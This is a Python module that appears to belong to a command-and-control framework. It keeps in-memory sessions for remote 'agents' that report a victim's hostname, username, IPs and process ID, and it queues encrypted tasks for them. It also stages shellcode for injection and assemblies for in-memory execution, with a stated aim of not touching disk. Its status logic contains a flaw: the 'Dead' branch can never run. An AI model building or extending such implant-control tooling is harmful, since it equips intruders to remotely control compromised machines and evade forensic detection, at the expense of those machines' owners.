"""
Agent Manager - Multi-agent session handler with in-memory task queues
Handles multiple concurrent agent connections without touching disk
"""
import threading
from datetime import datetime
from collections import defaultdict
import queue
import time

class AgentSession:
    """Represents a single agent session"""
    def __init__(self, name, key, listener_name, listener_ip, listener_port):
        self.name = name
        self.key = key
        self.listener_name = listener_name
        self.listener_ip = listener_ip
        self.listener_port = listener_port
        self.active = False
        self.last_seen = None
        self.first_seen = None
        self.hostname = None
        self.username = None
        self.local_ips = None
        self.os_info = None
        self.pid = None
        self.task_queue = queue.Queue()  # In-memory task queue
        self.result_queue = queue.Queue()  # In-memory result queue
        self.pending_assembly = None  # For in-memory assembly execution
        self.pending_shellcode = None  # For shellcode injection
        self.lock = threading.Lock()

    def checkin(self, info_dict=None):
        """Agent check-in handler"""
        now = datetime.now()
        if not self.first_seen:
            self.first_seen = now
        self.last_seen = now
        self.active = True
        
        if info_dict:
            self.hostname = info_dict.get('hostname')
            self.username = info_dict.get('username')
            self.local_ips = info_dict.get('local_ips')
            self.os_info = info_dict.get('os_info')
            self.pid = info_dict.get('pid')

    def add_task(self, task):
        """Add encrypted task to queue"""
        self.task_queue.put(task)

    def get_task(self):
        """Get next task from queue (non-blocking)"""
        try:
            return self.task_queue.get_nowait()
        except queue.Empty:
            return None

    def add_result(self, result):
        """Add result to queue"""
        self.result_queue.put({
            'result': result,
            'timestamp': datetime.now()
        })

    def get_result(self, timeout=0.5):
        """Get result from queue with optional timeout"""
        try:
            return self.result_queue.get(timeout=timeout)
        except queue.Empty:
            return None

    def has_pending_tasks(self):
        """Check if there are pending tasks"""
        return not self.task_queue.empty()

    def get_status(self):
        """Get agent status info"""
        status = "Active" if self.active else "Inactive"
        if self.last_seen:
            elapsed = (datetime.now() - self.last_seen).total_seconds()
            if elapsed > 60:
                status = "Stale"
            elif elapsed > 300:
                status = "Dead"
                self.active = False
        return {
            'name': self.name,
            'status': status,
            'hostname': self.hostname,
            'username': self.username,
            'local_ips': self.local_ips,
            'last_seen': self.last_seen.strftime("%Y-%m-%d %H:%M:%S") if self.last_seen else "Never",
            'first_seen': self.first_seen.strftime("%Y-%m-%d %H:%M:%S") if self.first_seen else "Never"
        }


class AgentManager:
    """Singleton manager for all agent sessions"""
    _instance = None
    _lock = threading.Lock()

    def __new__(cls):
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super().__new__(cls)
                    cls._instance._initialized = False
        return cls._instance

    def __init__(self):
        if self._initialized:
            return
        self.agents = {}  # name -> AgentSession
        self.agents_lock = threading.Lock()
        self.result_callbacks = defaultdict(list)  # name -> list of callbacks
        self._initialized = True

    def register_agent(self, name, key, listener_name, listener_ip, listener_port):
        """Register a new agent"""
        with self.agents_lock:
            if name not in self.agents:
                self.agents[name] = AgentSession(name, key, listener_name, listener_ip, listener_port)
            return self.agents[name]

    def get_agent(self, name):
        """Get agent by name"""
        with self.agents_lock:
            return self.agents.get(name)

    def get_all_agents(self):
        """Get all registered agents"""
        with self.agents_lock:
            return list(self.agents.values())

    def get_active_agents(self):
        """Get all active agents"""
        with self.agents_lock:
            return [a for a in self.agents.values() if a.active]

    def agent_checkin(self, name, info_dict=None):
        """Handle agent check-in"""
        agent = self.get_agent(name)
        if agent:
            agent.checkin(info_dict)
            return True
        return False

    def queue_task(self, name, encrypted_task):
        """Queue a task for an agent"""
        agent = self.get_agent(name)
        if agent:
            agent.add_task(encrypted_task)
            return True
        return False

    def get_task(self, name):
        """Get next task for an agent"""
        agent = self.get_agent(name)
        if agent:
            return agent.get_task()
        return None

    def store_result(self, name, result):
        """Store result from agent"""
        agent = self.get_agent(name)
        if agent:
            agent.add_result(result)
            # Trigger any registered callbacks
            for callback in self.result_callbacks.get(name, []):
                try:
                    callback(name, result)
                except:
                    pass
            return True
        return False

    def get_result(self, name, timeout=0.5):
        """Get result from agent queue"""
        agent = self.get_agent(name)
        if agent:
            return agent.get_result(timeout)
        return None

    def register_result_callback(self, name, callback):
        """Register a callback for when results arrive"""
        self.result_callbacks[name].append(callback)

    def unregister_result_callback(self, name, callback):
        """Unregister a result callback"""
        if callback in self.result_callbacks.get(name, []):
            self.result_callbacks[name].remove(callback)

    def remove_agent(self, name):
        """Remove an agent"""
        with self.agents_lock:
            if name in self.agents:
                del self.agents[name]
                return True
        return False

    def set_pending_assembly(self, name, assembly_bytes):
        """Set pending assembly for in-memory execution"""
        agent = self.get_agent(name)
        if agent:
            agent.pending_assembly = assembly_bytes
            return True
        return False

    def get_pending_assembly(self, name):
        """Get and clear pending assembly"""
        agent = self.get_agent(name)
        if agent and agent.pending_assembly:
            assembly = agent.pending_assembly
            agent.pending_assembly = None
            return assembly
        return None

    def set_pending_shellcode(self, name, shellcode_bytes):
        """Set pending shellcode for injection"""
        agent = self.get_agent(name)
        if agent:
            agent.pending_shellcode = shellcode_bytes
            return True
        return False

    def get_pending_shellcode(self, name):
        """Get and clear pending shellcode"""
        agent = self.get_agent(name)
        if agent and agent.pending_shellcode:
            shellcode = agent.pending_shellcode
            agent.pending_shellcode = None
            return shellcode
        return None


# Global instance
agent_manager = AgentManager()

